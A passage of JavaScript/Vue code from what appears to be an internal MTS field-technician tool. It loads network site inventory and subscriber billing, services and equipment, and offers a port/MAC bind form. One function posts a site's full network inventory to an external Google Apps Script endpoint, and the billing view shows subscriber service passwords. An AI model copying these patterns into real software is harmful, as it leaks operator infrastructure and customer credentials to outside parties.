								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+device.DEVICE_NIOSS_ID)});
								loader(siteid,true,'device_info_'+device.DEVICE_NAME);
								fetch('/call/device/device_info',{'method':'POST','headers':headers,'body':JSON.stringify({'device':device.DEVICE_NAME}),}).then(function(resp){return resp.json()}).then(function(device_info){
									Object.assign(sites[siteid].devices[device.DEVICE_NIOSS_ID],device_info.data[0]);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'device_info_'+device.DEVICE_NAME)});
							});
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'devices_'+siteid)});
						loader(siteid,true,'site_rack_list_'+siteid);
						fetch('/call/device/site_rack_list',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(racks_data){let racks=racks_data.data;
							for(let rack of racks.filter(function(item){return !item.nioss_error})){
								sites[siteid].racks[rack.RACK_ID]=rack;
								loader(siteid,true,'get_nioss_object_'+rack.RACK_ID);
								fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:rack.RACK_ID,object:'rack'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
									Object.assign(sites[siteid].racks[rack.RACK_ID],nioss_data.data);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+rack.RACK_ID)});
							};
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'site_rack_list_'+siteid);});
						loader(siteid,true,'patch_panels_'+siteid);
						fetch('/call/device/patch_panels',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(plints_data){let plints=plints_data.data;
							let ppanels=plints;for(let pp of ppanels){ppanels=ppanels.concat(pp.children);};/*поднятие из топологии*/
							for(let pp of ppanels.filter(function(item){return !item.nioss_error})){
								sites[siteid].ppanels[pp.id]=pp;
								loader(siteid,true,'get_nioss_object_'+pp.id);
								fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:pp.id,object:'device'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
									Object.assign(sites[siteid].ppanels[pp.id],nioss_data.data);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+pp.id)});
							};
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'patch_panels_'+siteid)});
						
						testLoadPL(siteid);
						
					}else{
						document.getElementById('btn_downloadPL').removeAttribute('disabled');
						document.getElementById('loader_downloadPL').style.display='none';
					};
				}).catch(function(err){console.log(err)}).finally(function(){});
				function testLoadPL(siteid){
					let timer=setTimeout(testLoad,100);
					function testLoad(){
						let counter={all:0,done:0};
						for(let load in sites[siteid].loads){
							counter.all++;
							if(sites[siteid].loads[load]){
								counter.done++;
							};
							console.log('siteid:'+siteid+' loads: all:'+counter.all+' done:'+counter.done);
						};
						if(counter.all==counter.done){
							clearTimeout(timer);
							downloadPL(preparePL(siteid));
							document.getElementById('btn_downloadPL').removeAttribute('disabled');
							document.getElementById('loader_downloadPL').style.display='none';
							alert('план-схема отправлена на '+username+'@mts.ru');
						}else{
							timer=setTimeout(testLoad,100);
						};
					};
				};
				function downloadPL(obj){
					fetch('https://script.google.com/macros/s/AKfycbxl1S7H0iftlsBt8Tx-gL0zE-qwbwSN4TsUBpPqdIe9uMWtwgHfNGXb/exec',{
						'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
						'body':JSON.stringify(obj)
					}).then(function(obj){}).catch(function(err){console.log(err)}).finally(function(){});
				};
				function preparePL(siteid){
					let title=sites[siteid].nodes[0].name+' '+new Date().toLocaleDateString()+' '+new Date().toLocaleTimeString()+' '+username;
					return {
						username:username,
						sitename:sites[siteid].nodes[0].name,
						address:sites[siteid].nodes[0].address,
						siteid:siteid,
						title:title,
						json:JSON.stringify({[siteid]:sites[siteid]}),
						html:'',
					};
				};
			},
			async loadEntrances(force=false){
				if (this.loading.entrances) return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.entrances)return;
					const cache=this.$cache.getItem(`site_entrance_list/${siteid}`);
					if(cache){
						this.responses.entrances = cache;
						return;
					};
				};
				this.loading.entrances=true;
				const response=await httpGet(buildUrl('site_entrance_list',{siteid}));
				this.$cache.setItem(`site_entrance_list/${siteid}`,response);
				this.responses.entrances=response;
				this.loading.entrances=false;
			},
			async loadDevices(force=false){
				if(this.loading.devices)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.devices)return;
					const cache=this.$cache.getItem(`devices/${siteid}`);
					if(cache){
						this.responses.devices=cache;
						return;
					};
				};
				this.loading.devices=true;
				const response=await httpGet(buildUrl('devices',{siteid}));
				this.$cache.setItem(`devices/${siteid}`,response);
				this.responses.devices=response;
				this.loading.devices=false;
			},
			async loadFloors(force=false){
				if(this.loading.floors)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.floors)return;
					const cache=this.$cache.getItem(`site_flat_list/${siteid}`);
					if(cache){
						this.responses.floors=cache;
						return;
					};
				};
				this.loading.floors=true;
				const response=await httpGet(buildUrl('site_flat_list',{siteid}));
				this.$cache.setItem(`site_flat_list/${siteid}`,response.data);
				this.responses.floors=response.data;
				this.loading.floors=false;
			},
			async loadRacks(force=false){
				if(this.loading.racks)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.racks) return;
					const cache=this.$cache.getItem(`site_rack_list/${siteid}`);
					if(cache){
						this.responses.racks=cache;
						return;
					};
				};
				this.loading.racks=true;
				const response=await httpGet(buildUrl('site_rack_list',{siteid}));
				this.$cache.setItem(`site_rack_list/${siteid}`,response);
				this.responses.racks=response;
				this.loading.racks=false;
			},
			async loadPlints(force=false){
				if(this.loading.plints)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.plints)return;
					const cache=this.$cache.getItem(`patch_panels/without_tree/${siteid}`);
					if(cache){
						this.responses.plints=cache;
						return;
					};
				};
				this.loading.plints=true;
				const response=await httpGet(buildUrl('patch_panels',{siteid,without_tree:true}));
				this.$cache.setItem(`patch_panels/without_tree/${siteid}`,response);
				this.responses.plints=response;
				this.loading.plints=false;
			},
			refresh(){
				localStorage.clear();
				document.location.reload();
			},
		},
		beforeRouteEnter(to,from,next){
			const {name,params}=to;
			const isChild=name==='entrance';
			const isEmptyProps=!params.siteProp&&!params.entranceProp;
			if(isChild&&isEmptyProps){
				next({name:'search',params:{text:encodeURIComponent(`entrance/${params.entrance_id}`)}});
				return;
			};
			if(!params.siteProp){
				next({name:'search',params:{text:params.site_id}});
				return;
			};
			next();
		},
		beforeRouteUpdate(to,from,next){
			const {params}=to;
			const sameSiteId=to.params.site_id===this.site.id||to.params.site_id===this.site.node;
			if(!sameSiteId&&!params.siteProp){
				next({name:'search',params:{text:params.site_id}});
				return;
			};
			next();
		},
	});
	
	document.getElementById('account-page-template').innerHTML=`<my-account-page v-bind="$props"/>`;
	Vue.component('my-account-page', {
	  template:`
		<section class="account-page">
		  <template  v-if='ready'>
			  <card-block>
				  <title-main :text="account.ACCOUNT" icon="person" />
				  <info-subtitle>
					  <div class="d-center-y">
						  <span v-if="order" style="text-transform: capitalize;">{{ order.customer }}</span>
						  <span v-else-if="account && localAccount" style="text-transform: capitalize;">{{ localAccount.name }}</span>
						  <template v-if='flat || account.FLAT_NUMBER'><span style="padding: 0 4px">•</span><i class='ic-20 ic-apartment'></i><span style="padding-left: 4px;">{{ flat || account.FLAT_NUMBER }} кв.</span></template>
					  </div>
				  </info-subtitle>
				  <template v-if='localAccount'>
					  <devider-line />

					  <info-text-icon :text='computedAddress' type='medium' icon=''/>

					  <devider-line />

					  <title-main :text="localAccount.name" icon="person" style="text-transform: capitalize;" />
					  <a v-if='phone' class="call-link mb-3" :href="'tel:' + getPhoneWithPlus(phone)">
					  <div>
						  <div class="tone-900 font--15-500 call-link__number">{{ getPhoneWithPlus(phone) }}</div>
						  <div class='tone-500 font--13-500'>позвонить абоненту</div>
					  </div>
					  <div class="call-link__icon"><i class="ic-24 ic-phone-1"></i></div>
					  </a>

					  <devider-line v-if='agreement'/>
					  <template v-if='agreement'>
						  <info-value icon='purse' :value='balance' type='extra' label='баланс' />
						  <info-value icon='clock' :value='lastPay' type='extra' label='платеж' />
					  </template>
					  <template v-if='agreement && agreement.isconvergent'>
						  <devider-line />
							<info-value icon='phone' :value="'+' + agreement.convergentmsisdn" type='extra' label='конвергент'/>
						  <info-value icon='purse' :value='convergentBalance' type='extra' label='баланс'/>
					  </template>
				  </template>
				  <devider-line />
				  <link-block text="информация в биллинге" icon="server" actionIcon="expand" @block-click="openBillingInfo"/>
				  <my-billing-info-modal ref='billingInfo' :billingInfo='billingInfo' :loading='loading.vgroups'/>
				  <link-block text="отправить смс с новым паролем" icon="sms" actionIcon="expand" @block-click="openSendSmsModal"/>
				  <send-sms-modal ref='sendSms' :account='account.ACCOUNT'/>
			  </card-block>

			  <card-block v-if="localAccount">
				<title-main text="недоступность" icon="accidents" textSize="large" :attention="hasActiveIncident?'warn':null" @block-click="toEvents">
					<button-sq icon="right-link" class="no-events"/>
				</title-main>
			  </card-block>

			  <div v-if='agreement'>
				  <card-block v-for='(group, key) in groupServiceList' :key='key' class='mini-card mt-0'>
					  <title-main class='mb-2' icon='eth' :text='group.name' textSize='large' @open="opened[key] = !opened[key]" />
					  <div v-show="opened[key]">
						  <card-block v-if='key == "internet"'>
							  <title-main text='порт' textSize='medium'></title-main>
							  <traffic-light-el v-if="localAccount" :data="account" :account="localAccount" :sessions="[]"/>
							  <link-block v-if='account.PORT_NAME' actionIcon='right-link' icon="port" :text="account.PORT_NAME" :search="account.PORT_NAME" />
							  <info-subtitle v-if='account.PORT_NAME' class='ml-4 pl-4' :text="'последний опрос MAC ' + account.LAST_DATE" />
						  </card-block>
						  <sessions v-if='key == "internet"' :services='group.services'></sessions>
						  <services-el class='mt-2' :account='localAccount' :services='group.services' :name='group.name' :accountNumber='account.ACCOUNT'/>
						  <div v-if='group.equipments.length > 0'>
							  <div v-for="equip in group.equipments">
								  <equipment :equipment="equip" :account="account.ACCOUNT" :key="equip.id" />
							  </div>
						  </div>
					  </div>
				  </card-block>
			  </div>
			  <account-locks  v-if='localAccount' :locks='locks'/>
			  <div v-if='loading.account' class='d-flex justify-content-center'>
				  <div class="spinner-grow text-secondary text-center" role="status">
					  <span class="sr-only"></span>
				  </div>
			  </div>
		  </template>
		  <div v-else class='d-flex justify-content-center'>
			  <div class="spinner-grow text-secondary text-center" role="status">
				  <span class="sr-only"></span>
			  </div>
		  </div>
	  </section>
	  `,
	  props: {
		order: Object,
		building: Object,
		entrance: Object,
		account: Object,
		flat: Number,
	  },
	  data: () => ({
		localAccount: null,
		session: null,
		equipments: null,
		opened: {
		  internet: true,
		  tv: true,
		  iptv: true,
		  phone: true,
		  hybrid: true,
		  other: true,
		},
		billingInfo:[],
		loading: {
		  account: false,
		  vgroups: false,
		  locks: false
		},
		convergentBalance: null,
		locks: {},
		events: null,
	  }),
	  watch: {
		account(val, old) {
		  if (val && val.ACCOUNT) {
			this.localAccount = null;
			this.loadLbsvAccount();
			this.loadAccountEvents();
		  };
		}
	  },
	  async created() {
		if (this.account) await this.loadLbsvAccount();
		this.loadAccountEvents();
	  },
	  computed: {
		ready() {
		  return this.account && this.account.ACCOUNT;
		},
		balance() {
		  let balance = this.agreement.balance;
		  let str = balance.integer + '.' + balance.fraction + ' ₽';
		  if (balance.minus) return '-' + str;
		  return str;
		},
		lastPay() {
		  const lastsum = this.agreement.lastsum || '';
		  const lastpaydate = this.agreement.lastpaydate || '';
		  const rub = lastsum ? '₽' : '';
		  const point = lastpaydate ? '•' : '';
		  return `${lastsum} ${rub} ${point} ${lastpaydate}`;
		},
		agreement() {
		  if (!this.localAccount) return '';
		  let account = this.account.ACCOUNT;
		  return this.localAccount.agreements.find(function (agr) {
			return agr.account.replace(/-/g, '') === account.replace(/-/g, '');
		  });
		},
		computedAddress() {
		  if (!this.localAccount) return '';
		  if (this.agreement) {
			const service = this.localAccount.vgroups.find((s) => s.agrmid == this.agreement.agrmid && s.connaddress);
			if (service) return service.vgaddress || service.connaddress;
		  }
		  let address = {};
		  if (Array.isArray(this.localAccount.addresses)) {
			address = this.localAccount.addresses.find((a) => a.address) || {};
		  };
		  return this.localAccount.address || address.address || '';
		},
		serviceList() {
		  if (this.agreement) {
			let agreement = this.agreement;
			return this.localAccount.vgroups.filter(function (service) {
			  return service.agrmid === agreement.agrmid;
			});
		  };

		  return [];
		},
		serviceError() {
		  if (this.localAccount.vgroups.length === 1) {
			const error = this.localAccount.vgroups[0];
			if (error.type === 'error') {
			  return 'услуги не загружены. перезагрузить страницу.';
			};
			if (error.type === 'warning') {
			  return 'услуги у абонента не найдены.';
			};
		  };
		  return '';
		},
		internetEq() {
		  if (!this.equipments) return [];
		  return this.equipments.filter((e) => e.type_id == 4);
		},
		tvEq() {
		  if (!this.equipments) return [];
		  let equipments = this.equipments.filter((e) => [1, 2, 3].includes(parseInt(e.type_id, 10)));
		  equipments.forEach((equip) => {
			if (!equip.card || !this.localAccount.vgroups) return;
			this.localAccount.vgroups.forEach((vg) => {
			  if (!vg.smartcards) return;
			  vg.smartcards.forEach((card) => {
				if (!card.smartcard || !card.smartcard.serial === equip.card) return;
				equip.vg = vg;
			  });
			});
		  });
		  return equipments;
		},
		iptvEq() {
		  if (!this.equipments) return [];
		  return this.equipments.filter((e) => e.type_id == 7);
		},
		hybridEq() {
		  if (!this.equipments) return [];
		  return this.equipments.filter((e) => e.type_id == 5);
		},
		phoneEq() {
		  if (!this.equipments) return [];
		  return this.equipments.filter((e) => e.type_id == 6);
		},
		otherEq() {
		  if (!this.equipments) return [];
		  return this.equipments.filter((e) => e.type_id == 0);
		},
		groupServiceList() {
		  let services = {
			internet: {
			  name: 'Интернет',
			  equipments: this.internetEq,
			  services: [],
			},
			tv: {
			  name: 'ТВ',
			  equipments: this.tvEq,
			  services: [],
			},
			iptv: {
			  name: 'IPTV',
			  equipments: this.iptvEq,
			  services: [],
			},
			phone: {
			  name: 'Телефония',
			  equipments: this.phoneEq,
			  services: [],
			},
			hybrid: {
			  name: 'ИТВ',
			  equipments: this.hybridEq,
			  services: [],
			},
			other: {
			  name: 'Другие',
			  equipments: this.otherEq,
			  services: [],
			},
		  };
		  this.serviceList.forEach((s) => {
			const service = services[s.type];
			if (service) service.services.push(s);
			else console.warn('Service not found:', s.type);
		  });
		  const filtered = {};
		  for (const [name, params] of Object.entries(services)) {
			if (params.services.length || params.equipments.length) filtered[name] = params;
		  };
		  return filtered;
		},
		phone() {
		  const phone = this.localAccount.mobile || this.localAccount.phone;
		  return phone;
		},
		hasActiveIncident() {
		  if (!this.events) return false;
		  return Boolean(this.events.active && this.events.active.length);
		},
		currentItem() {
		  return this.navItems[this.currentIndex];
		},
		currentIndex() {
		  const {
			id
		  } = this.$route.params;
		  if (id) return 0;
		  return this.navItems.findIndex(({
			fullName
		  }) => fullName === id);
		},
		title() {
		  const {
			id
		  } = this.$route.params;
		  if (!id) return 'кв';
		  return `${this.currentItem.name}`;
		},
	  },
	  methods: {
		getPhoneWithPlus(phone) {
		  return getPhoneWithPlus(phone);
		},
		async loadLbsvAccount() {
		  this.loading.account = true;
		  if (!this.localAccount || this.localAccount.account_numbers.includes(this.account.ACCOUNT)) {
			await httpGet('/call/lbsv/search?text=' + this.account.ACCOUNT + '&type=account&city=any').then((data) => {
			  const account =
				data.type === 'list' ?
				  data.data.find((data) => data.agreements[0] && data.agreements[0].archive === '0') :
				  data.data;
			  this.localAccount = account;
			});
		  };
		  this.loadClientEquipment();
		  this.getAuthAndSpeed();
		  this.loadLocks();
		  if (this.localAccount.isconvergent) this.getForisData();
		  this.loading.account = false;
		},
		loadClientEquipment() {
		  if (this.equipments) return;
		  const params = {
			serverid: this.agreement.serverid,
			userid: this.agreement.userid,
			agrmid: this.agreement.agrmid,
		  };
		  httpGet(buildUrl('client_equipment', params, '/call/lbsv/')).then((data) => {
			if (data.type === 'error') console.warn(data);
			else this.equipments = data;
		  });
		},
		async getAuthAndSpeed() {
		  this.billingInfo=[];
		  const {internet} = this.groupServiceList;
		  if (!internet) return;
		  this.loading.vgroups = true;
		  const promises = [];
		  const filteredServices = internet.services.filter((service) =>service.agrmid === this.agreement.agrmid && service.isSession && [2, 4, 6].includes(Number(service.agenttype)));

		  for (const service of filteredServices) {
			const {login,serverid,vgid} = service;
			const params = {login,serverid,vgid,date: ''};
			promises.push(
			  httpGet(buildUrl('get_auth_type', params, '/call/aaa/'), true).then((response) => {
				if (response.code == '200' && response.data.length > 0 && response.data[0].auth_type) {
				  service.auth_type = response.data[0].auth_type;
				}
			  })
			);
			promises.push(
			  httpGet(buildUrl('get_user_rate',params,'/call/aaa/'),true).then((response)=>{
				if(response.type!='error'&&response.data&&response.data.length>0){
					service.rate=response.data[0].rate + ' Мбит/c';
				};
				this.billingInfo.push({
					rateData:response.data?response.data[0]:false,
					respObj:response,
					serviceObj:filterProps(service,'vgid,status,login,pass,type_of_bind,descr,agentid,agenttype,userid'),
					accountObj:filterProps(this.localAccount,'serverid,login,cityid,billingid'),
				});
			  })
			);
		  }

		  await Promise.all(promises);
		  this.loading.vgroups = false;
		},
		openBillingInfo() {
		  this.$refs.billingInfo.open();
		},
		openSendSmsModal() {
		  if (!this.account) return;
		  this.$refs.sendSms.open();
		},
		callTo() {
		  const phone = this.getPhoneWithPlus(this.localAccount.mobile);
		  window.open(`tel:${phone}`, '_self');
		},
		getForisData() {
		  httpGet(`/call/foris/account?text=${this.agreement.convergentmsisdn}&type=phone`).then((response) => {
			if (response.data && response.data.length > 0) {
			  let forisAcc = response.data[0];
			  this.getConvergentBalance(forisAcc);
			};
		  });
		},
		getConvergentBalance(acc) {
		  const account = acc.personal_account_number;
		  const url = buildUrl('balance_by_account', {
			account
		  }, '/call/foris/');
		  httpGet(url)
			.then((response) => {
			  this.convergentBalance = response.amount;
			})
		},
		toEvents() {
		  this.$router.push({
			name: 'account_events',
			params: {
			  id: this.account.ACCOUNT,
			  accountProp: this.account,
			  localAccountProp: this.localAccount,
			  flatProp: this.flat || this.account.FLAT_NUMBER
			},
		  });
		},
		loadLocks() {
		  const today = new Date();
		  let before = new Date();
		  before.setMonth(before.getMonth() - 3);
		  const params = {
			userid: this.localAccount.userid,
			serverid: this.localAccount.serverid,
			start: Datetools.format(before),
			end: Datetools.format(today),
		  };
		  httpGet(buildUrl('blocks_history', params, '/call/lbsv/')).then((data) => {
			this.loading.locks = false;
			this.locks = data;
		  });
		},
		async loadAccountEvents() {
		  const params = {
			to: new Date(),
			from: Dt.addDays(-1),
			id: this.account.DEVICE_NIOSS_ID,
			device: this.account.DEVICE_NAME,
			contract: this.agreement.agrmnumber,
			regionid: this.account.MR_ID,
			serverid: this.localAccount && this.localAccount.serverid,
		  };
		  try {
			const response = await httpGet(buildUrl('events_by_contract', params));
			this.events = response;
		  } catch (error) {
			console.error('Load account events:', error);
		  };
		}
	  },
	});
	document.getElementById('billing-info-modal').innerHTML=`<my-billing-info-modal v-bind="$props"/>`;
	Vue.component('my-billing-info-modal', {
		template:`
			<modal-container ref='billingInfo'>
				<div>
					<h3 class="font--18-600 tone-900 d-center-x">настройки профиля абонента</h3>
					<h5 class="font--13-500-140 tone-500 d-center-x">информация в биллинге</h5>
				</div>
				<div v-if="loading"><loader-bootstrap></loader-bootstrap></div>
				<div v-else-if="billingInfo" style="display:flex;flex-direction:column;flex-grow:1;">
					<template v-for='infoObj in billingInfo'>
						<div style="box-shadow:3px 3px 3px 3px rgba(0,0,0,0.1);margin:1em;background-color:#fff;padding-bottom:1em;">
							<h5 class="font--13-500-140" style="margin-top:1em;padding-left:1em;">{{infoObj.serviceObj.login}} • {{infoObj.serviceObj.vgid}}</h5>
							<div v-if="infoObj.rateData">
								<div style="margin-left:1em;margin-right:1em;margin-bottom:0.5em;display:grid;grid-template-columns:68% 30%;grid-gap:0.5em;">
									<div><input-el :disabled="!!setBind_result.loading" v-model="infoObj.rateData.deviceIP" label='switch_ip' type="text" v-filter="'[0-9\.]'" maxlength="15"/></div>
									<div><input-el :disabled="!!setBind_result.loading" v-model="infoObj.rateData.portNumber" label='port' type="text" v-filter="'[0-9]'" maxlength="7"/></div>
									<div><input-el :disabled="!!setBind_result.loading" v-model="(infoObj.rateData.macCPE.length>0)?infoObj.rateData.macCPE[0]:infoObj.rateData.deviceMac" label='abon_mac' type="text" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23"/></div>
									<div style="padding:0.5em;"><button-main label="bind" @click="setBind(infoObj)" :disabled="!!setBind_result.loading" :loading="!!setBind_result.loading" buttonStyle="contained" style="width:100%;height:100%;"/></div>
								</div>
								<div>
									<message-el v-if="!!setBind_result.text" :text="setBind_result.text" :type="setBind_result.type" :box="true"></message-el>
								</div>
								<template v-if="showItem(item, infoObj.rateData[item])" v-for="item in items">
									<info-value v-if='getValue(infoObj.rateData[item])' :value='getValue(infoObj.rateData[item])' type='large' :label='getTitle(item)' :withLine='true'/>
								</template>
								<template v-for='item in itemsWithFormat'>
									<template v-if="showItem(item.key, infoObj.rateData[item.key])">
										<template v-if='Array.isArray(getValueByItem(item, infoObj.rateData))'>
											<info-value v-for='arr_item in getValueByItem(item, infoObj.rateData)' :key='item.title' :value='getValueByItem(item, infoObj.rateData)' type='large' :label='item.title :withLine='true'/>
										</template>
										<info-value v-else :value='getValueByItem(item, infoObj.rateData)' type='large' :label='item.title' :withLine='true'/>
									</template>
								</template>
							</div>
							<div v-else>
								<h5 class="font--13-500-140" style="margin-top:1em;padding-left:1em;color:#fd7e14;">{{infoObj.respObj.message}}</h5>
								<template v-if="showItem(item, infoObj.respObj[item])" v-for="item in items_err">
									<info-value v-if='getValue(infoObj.respObj[item])' :value='getValue(infoObj.respObj[item])' type='medium' :label='item' :withLine='true'/>
								</template>
							</div>
							<title-main icon="card" :text="'dev_info'" @open="openDevInfo=!openDevInfo"></title-main>
							<div v-show="openDevInfo">
								<template v-if="showItem(item, infoObj.serviceObj[item])" v-for="item in items_dev">
									<info-value v-if='getValue(infoObj.serviceObj[item])' :value='getValue(infoObj.serviceObj[item])' type='medium' :label='item' :withLine='true'/>
								</template>
							</div>
						</div>
					</template>
					<template v-if="billingInfo[0]&&billingInfo[0].accountObj">
						<title-main icon="card" :text="'dev_info'" @open="openDevInfo=!openDevInfo"></title-main>
						<div v-show="openDevInfo">
							<template v-if="showItem(item, billingInfo[0].accountObj[item])" v-for="item in items_acc_dev">
								<info-value v-if="getValue(billingInfo[0].accountObj[item])" :value="getValue(billingInfo[0].accountObj[item])" type="medium" :label="item" :withLine="true"/>
							</template>
						</div>
					</template>
				</div>
				<h5 v-else class="font--13-500-140 tone-600 d-center-x">нет данных</h5>
		</modal-container>
		`,
		props:{
			billingInfo:{type:Array,required:true,},
			loading:Boolean,
		},
		data(){
			return {
				items:[
					'deviceIP',
					'portNumber',
					'macCPE',
					'deviceMac',
					'ip',
					'innerVLan',
					'outerVLan',
				],
				items_err:[
					'code',
					'type',
				],
				items_dev:[
					'vgid',
					'status',
					'login',
					'pass',
					'type_of_bind',
					'descr',
					'agentid',
					'agenttype',
					'userid',
				],
				items_acc_dev:[
					'login',
					'serverid',
					'cityid',
					'billingid',
				],
				itemsWithFormat:{
					deviceSegment:{
						title:'сегмент',
						key:'deviceSegment',
						format:(val)=>val.split(','),
					},
					maxSessions:{
						title:'кол. сессий',
						key:'maxSessions',
					},
					accOnDateFirst:{
						title:'активация',
						key:'accOnDateFirst',
						format:this.formatDate,
					},
					blockDate:{
						title:'блокировка',
						key:'blockDate',
						format:this.formatDate,
					},
				},
				setBind_result:{
					loading:false,
					text:'',
					type:'',
				},
				openDevInfo:false,
			};
		},
		computed:{},
		methods:{
			open(){
				this.$refs.billingInfo.open();
			},
			formatDate(value){
				const date=new Date(value);
				if(!date) return '';
				return Datetools.format(date,'datetime');
			},
			showItem(key,value){
				if(!value) return false;
				const filters=['deviceId'];
				if(filters.includes(key)) return false;
				if(Array.isArray(value)) return !!value.length;
				if(typeof value==='object') return !!Object.values(value).length;
				return !!value;
			},
			getTitle(name){
				if(/deviceIP/i.test(name)) return 'коммутатор';
				if(/portNumber/i.test(name)) return 'порт';
				if(/deviceMac/i.test(name)) return 'MAC-адрес';
				if(/ip/i.test(name)) return 'IP-адрес';
				if(/macCPE/i.test(name)) return 'MAC-адрес';
				if(/innerVLan/i.test(name)) return 'vlan inner';
				if(/outerVLan/i.test(name)) return 'vlan outer';
				return name;
			},
			getValue(value){
				if(Array.isArray(value)&&value.length>0){
					if(Object.keys(value[0]).includes('IP')) return value.map(i=>i.IP).join(', ');
					return value.join(', ');
				};
				if(typeof value==='object') return String(value);
				return value;
			},
			getValueByItem(item, billing){
				let value=billing[item.key];
				if(!value) return '';
				if(item.format){
					value=item.format(value);
				};
				return this.getValue(value);
			},
			setBind(infoObj){
				let props={
					ip:infoObj.rateData.deviceIP,
					port:infoObj.rateData.portNumber,
					/*client_ip:infoObj.rateData.deviceIP,*/
					mac:(infoObj.rateData.macCPE.length>0)?infoObj.rateData.macCPE[0]:infoObj.rateData.deviceMac,
					account:infoObj.accountObj.login,
					agentid:infoObj.serviceObj.agentid,
					login:infoObj.serviceObj.login,
					serverid:infoObj.accountObj.serverid,
					type_of_bind:infoObj.serviceObj.type_of_bind,
					vgid:infoObj.serviceObj.vgid,
				};
				switch(infoObj.serviceObj.type_of_bind){
					case 2:/*'ins_mac'*/
						this.bind('ins_mac',props);
					break;
					case 5:/*'set_bind(3)+ins_only_mac'*/
						this.bind('ins_only_mac',props);
					case 3:case 10:/*'set_bind(3)'*/
						this.bind('set_bind',props,3);
					break;
					case 7:case 9:/*'set_bind(7)'*//*'set_bind(9)'*/
						this.bind('set_bind',props);
					break;
					default:/*нет*/
						this.bind('',props);
				};
			},
			bind(method,props,type_of_bind){
				this.setBind_result={loading:true,text:'',type:''};
				if(method){
					if(type_of_bind){props.type_of_bind=type_of_bind};
					let othis=this;
					httpPost('/call/service_mix/'+method,props,true).then(function(result){
						console.log(result);
						if(result.type=='error'){
							othis.setBind_result={loading:false,text:result.text,type:'warn'};
						}else{
							othis.setBind_result={loading:false,text:result.InfoMessage,type:'success'};
						};
					},function() { 
						othis.setBind_result={loading:false,text:'ошибка к серверу',type:'error'}
					});
				}else{
					this.setBind_result={loading:false,text:'нет',type:'info'};
				};
			},
		},
	});
	/*
	}else{console.log(document.title)};

}());
*/
